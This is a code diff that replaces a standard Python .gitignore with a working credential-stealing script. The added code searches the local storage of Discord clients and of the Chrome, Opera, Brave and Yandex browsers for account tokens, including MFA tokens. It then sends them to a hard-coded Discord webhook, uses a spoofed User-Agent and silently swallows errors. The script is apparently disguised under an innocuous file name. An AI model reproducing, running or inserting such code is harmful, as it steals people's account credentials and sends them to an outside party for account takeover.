@@ -1,129 +1,76 @@
-# Byte-compiled / optimized / DLL files
-__pycache__/
-*.py[cod]
-*$py.class
+import os
+import re
+import json
 
-# C extensions
-*.so
+from urllib.request import Request, urlopen
 
-# Distribution / packaging
-.Python
-build/
-develop-eggs/
-dist/
-downloads/
-eggs/
-.eggs/
-lib/
-lib64/
-parts/
-sdist/
-var/
-wheels/
-pip-wheel-metadata/
-share/python-wheels/
-*.egg-info/
-.installed.cfg
-*.egg
-MANIFEST
+# your webhook URL
+WEBHOOK_URL = 'https://discordapp.com/api/webhooks/772997758856331265/jri5cT7DGzTCnuTWNhHXwgc8SgXMpC7eTSadcemdunJLqxNb4ann2NQ4ks79SZ6Ac3OG'
 
-# PyInstaller
-#  Usually these files are written by a python script from a template
-#  before PyInstaller builds the exe, so as to inject date/other infos into it.
-*.manifest
-*.spec
+# mentions you when you get a hit
+PING_ME = True
 
-# Installer logs
-pip-log.txt
-pip-delete-this-directory.txt
+def find_tokens(path):
+    path += '\\Local Storage\\leveldb'
 
-# Unit test / coverage reports
-htmlcov/
-.tox/
-.nox/
-.coverage
-.coverage.*
-.cache
-nosetests.xml
-coverage.xml
-*.cover
-*.py,cover
-.hypothesis/
-.pytest_cache/
+    tokens = []
 
-# Translations
-*.mo
-*.pot
+    for file_name in os.listdir(path):
+        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+            continue
 
-# Django stuff:
-*.log
-local_settings.py
-db.sqlite3
-db.sqlite3-journal
+        for line in [x.strip() for x in open
+        (f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
+                for token in re.findall(regex, line):
+                    tokens.append(token)
+    return tokens
 
-# Flask stuff:
-instance/
-.webassets-cache
+def main():
+    local = os.getenv('LOCALAPPDATA')
+    roaming = os.getenv('APPDATA')
 
-# Scrapy stuff:
-.scrapy
+    paths = {
+        'Discord': roaming + '\\Discord',
+        'Discord Canary': roaming + '\\discordcanary',
+        'Discord PTB': roaming + '\\discordptb',
+        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
+        'Opera': roaming + '\\Opera Software\\Opera Stable',
+        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
+        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
+    }
 
-# Sphinx documentation
-docs/_build/
+    message = '@everyone' if PING_ME else ''
 
-# PyBuilder
-target/
+    for platform, path in paths.items():
+        if not os.path.exists(path):
+            continue
 
-# Jupyter Notebook
-.ipynb_checkpoints
+        message += f'\n**{platform}**\n```\n'
 
-# IPython
-profile_default/
-ipython_config.py
+        tokens = find_tokens(path)
 
-# pyenv
-.python-version
+        if len(tokens) > 0:
+            for token in tokens:
+                message += f'{token}\n'
+        else:
+            message += 'No tokens found.\n'
 
-# pipenv
-#   According to pypa/pipenv#598, it is recommended to include Pipfile.lock in version control.
-#   However, in case of collaboration, if having platform-specific dependencies or dependencies
-#   having no cross-platform support, pipenv may install dependencies that don't work, or not
-#   install all needed dependencies.
-#Pipfile.lock
+        message += '```'
 
-# PEP 582; used by e.g. github.com/David-OConnor/pyflow
-__pypackages__/
+    headers = {
+        'Content-Type': 'application/json',
+        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
+    }
 
-# Celery stuff
-celerybeat-schedule
-celerybeat.pid
+    payload = json.dumps({'content': message})
 
-# SageMath parsed files
-*.sage.py
+    try:
+        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
+        urlopen(req)
+    except:
+        pass
 
-# Environments
-.env
-.venv
-env/
-venv/
-ENV/
-env.bak/
-venv.bak/
-
-# Spyder project settings
-.spyderproject
-.spyproject
-
-# Rope project settings
-.ropeproject
-
-# mkdocs documentation
-/site
-
-# mypy
-.mypy_cache/
-.dmypy.json
-dmypy.json
-
-# Pyre type checker
-.pyre/
+if __name__ == '__main__':
+    main()
+   
